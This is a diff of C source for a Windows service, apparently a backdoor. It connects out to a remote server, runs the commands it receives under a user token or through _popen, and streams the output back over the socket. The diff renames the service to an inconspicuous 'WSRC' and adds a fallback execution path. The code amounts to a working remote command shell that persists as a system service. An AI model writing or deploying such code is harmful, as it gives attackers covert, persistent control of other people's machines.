@@ -1,10 +1,29 @@
+/*
+Made by Q3dlaXpoaQ
+
+Remeber to add this codes in every break:
+if (clientSocket != INVALID_SOCKET)
+{
+    closesocket(clientSocket);
+}
+g_ServiceStatus.dwCurrentState = SERVICE_STOPPED;
+SetServiceStatus(g_StatusHandle, &g_ServiceStatus);
+// 设置事件，通知服务已经停止
+SetEvent(g_ServiceStopEvent);
+
+This can stop the service correctly
+
+
+*/
 #include <stdio.h>
 #include <tchar.h>
 #include <winsock2.h>
 #include <windows.h>
-void cmd(char *command, SOCKET s);
 void WINAPI ServiceMain(DWORD argc, LPTSTR *argv);
 void WINAPI ServiceCtrlHandler(DWORD controlCode);
+void sendChunkedData(SOCKET s, const char *data, int length);
+void executeCommandAsUser(SOCKET s, HANDLE hToken, const char *command);
+void Popen(SOCKET s, const char *command);
 
 SERVICE_STATUS g_ServiceStatus = {0};
 SERVICE_STATUS_HANDLE g_StatusHandle = NULL;
@@ -13,7 +32,7 @@ SOCKET clientSocket;
 
 void WINAPI ServiceMain(DWORD argc, LPTSTR *argv)
 {
-    g_StatusHandle = RegisterServiceCtrlHandler(TEXT("MyCmdService"), ServiceCtrlHandler);
+    g_StatusHandle = RegisterServiceCtrlHandler(TEXT("WSRC"), ServiceCtrlHandler);
 
     if (g_StatusHandle == NULL)
     {
@@ -59,9 +78,7 @@ void WINAPI ServiceMain(DWORD argc, LPTSTR *argv)
         fprintf(stderr, "连接服务器时出错\n");
         closesocket(clientSocket);
         WSACleanup();
-        // 设置事件，通知服务已经停止
-        SetEvent(g_ServiceStopEvent);
-        return 1;
+        return;
     }
     else
     {
@@ -101,7 +118,6 @@ void WINAPI ServiceMain(DWORD argc, LPTSTR *argv)
             SetServiceStatus(g_StatusHandle, &g_ServiceStatus);
             // 设置事件，通知服务已经停止
             SetEvent(g_ServiceStopEvent);
-
             break;
         }
         else
@@ -111,9 +127,9 @@ void WINAPI ServiceMain(DWORD argc, LPTSTR *argv)
             {
                 closesocket(clientSocket);
             }
-            // 设置事件，通知服务已经停止
             g_ServiceStatus.dwCurrentState = SERVICE_STOPPED;
             SetServiceStatus(g_StatusHandle, &g_ServiceStatus);
+            // 设置事件，通知服务已经停止
             SetEvent(g_ServiceStopEvent);
             break;
         }
@@ -130,9 +146,7 @@ void WINAPI ServiceMain(DWORD argc, LPTSTR *argv)
     g_ServiceStatus.dwCurrentState = SERVICE_STOPPED;
     SetServiceStatus(g_StatusHandle, &g_ServiceStatus);
 
-    WSACleanup();
-
-    // 清理Winsock库
+    WSACleanup(); // 清理Winsock库
 }
 void WINAPI ServiceCtrlHandler(DWORD controlCode)
 {
@@ -156,6 +170,53 @@ void WINAPI ServiceCtrlHandler(DWORD controlCode)
         break;
     }
 }
+void executeCommandAsUser(SOCKET s, HANDLE hToken, const char *command)
+{
+    HANDLE hReadPipe, hWritePipe;
+    SECURITY_ATTRIBUTES saAttr;
+    PROCESS_INFORMATION pi;
+    STARTUPINFO si;
+    DWORD bytesRead;
+    char buffer[102400];
+
+    ZeroMemory(&saAttr, sizeof(SECURITY_ATTRIBUTES));
+    saAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
+    saAttr.bInheritHandle = TRUE;
+    saAttr.lpSecurityDescriptor = NULL;
+
+    if (!CreatePipe(&hReadPipe, &hWritePipe, &saAttr, 0))
+    {
+        fprintf(stderr, "创建管道时出错\n");
+        Popen(s, command);
+        return;
+    }
+
+    ZeroMemory(&si, sizeof(STARTUPINFO));
+    si.cb = sizeof(STARTUPINFO);
+    si.hStdError = hWritePipe;
+    si.hStdOutput = hWritePipe;
+    si.dwFlags |= STARTF_USESTDHANDLES;
+
+    if (!CreateProcessAsUser(hToken, NULL, command, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi))
+    {
+        fprintf(stderr, "以用户身份创建进程时出错\n");
+        Popen(s, command);
+        CloseHandle(hReadPipe);
+        CloseHandle(hWritePipe);
+        return;
+    }
+
+    CloseHandle(hWritePipe);
+
+    while (ReadFile(hReadPipe, buffer, sizeof(buffer), &bytesRead, NULL) && bytesRead > 0)
+    {
+        sendChunkedData(s, buffer, bytesRead);
+    }
+
+    CloseHandle(hReadPipe);
+    CloseHandle(pi.hProcess);
+    CloseHandle(pi.hThread);
+}
 void sendChunkedData(SOCKET s, const char *data, int length)
 {
     int totalSent = 0;
@@ -170,73 +231,27 @@ void sendChunkedData(SOCKET s, const char *data, int length)
         totalSent += bytesSent;
     }
 }
-
-void executeCommandAsUser(SOCKET s, HANDLE hToken, const char *command)
+void Popen(SOCKET s, const char *command)
 {
+    FILE *fp;
+    char buffer[102400];
 
-    if (strstr(command, "dir") != NULL)
+    if ((fp = _popen(command, "r")) == NULL)
     {
-        FILE *fp;
-        char buffer[102400];
-
-        if ((fp = _popen(command, "r")) == NULL)
-        {
-            fprintf(stderr, "执行命令时出错\n");
-            return;
-        }
-
-        while (fgets(buffer, sizeof(buffer), fp) != NULL)
-        {
-            sendChunkedData(s, buffer, strlen(buffer));
-        }
-
-        _pclose(fp);
+        fprintf(stderr, "执行命令时出错\n");
+        return;
     }
-    else
+
+    while (fgets(buffer, sizeof(buffer), fp) != NULL)
     {
-        HANDLE hReadPipe, hWritePipe;
-        SECURITY_ATTRIBUTES saAttr;
-        PROCESS_INFORMATION pi;
-        STARTUPINFO si;
-        DWORD bytesRead;
-        char buffer[102400];
-
-        ZeroMemory(&saAttr, sizeof(SECURITY_ATTRIBUTES));
-        saAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
-        saAttr.bInheritHandle = TRUE;
-        saAttr.lpSecurityDescriptor = NULL;
-
-        if (!CreatePipe(&hReadPipe, &hWritePipe, &saAttr, 0))
-        {
-            fprintf(stderr, "创建管道时出错\n");
-            return;
-        }
-
-        ZeroMemory(&si, sizeof(STARTUPINFO));
-        si.cb = sizeof(STARTUPINFO);
-        si.hStdError = hWritePipe;
-        si.hStdOutput = hWritePipe;
-        si.dwFlags |= STARTF_USESTDHANDLES;
-
-        if (!CreateProcessAsUser(hToken, NULL, command, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi))
-        {
-            fprintf(stderr, "以用户身份创建进程时出错\n");
-            CloseHandle(hReadPipe);
-            CloseHandle(hWritePipe);
-            return;
-        }
-
-        CloseHandle(hWritePipe);
-
-        while (ReadFile(hReadPipe, buffer, sizeof(buffer), &bytesRead, NULL) && bytesRead > 0)
-        {
-            sendChunkedData(s, buffer, bytesRead);
-        }
-
-        CloseHandle(hReadPipe);
-        CloseHandle(pi.hProcess);
-        CloseHandle(pi.hThread);
+        sendChunkedData(s, buffer, strlen(buffer));
     }
+
+    _pclose(fp);
+}
+
+void WSRMCmd(const char *command)
+{
 }
 
 int main()
@@ -252,7 +267,7 @@ int main()
 
     schService = OpenService(
         schSCManager,           // SCManager database
-        TEXT("MyCmdService"),   // name of service
+        TEXT("WSRC"),           // name of service
         SERVICE_CHANGE_CONFIG); // need change config access
 
     ChangeServiceConfig(
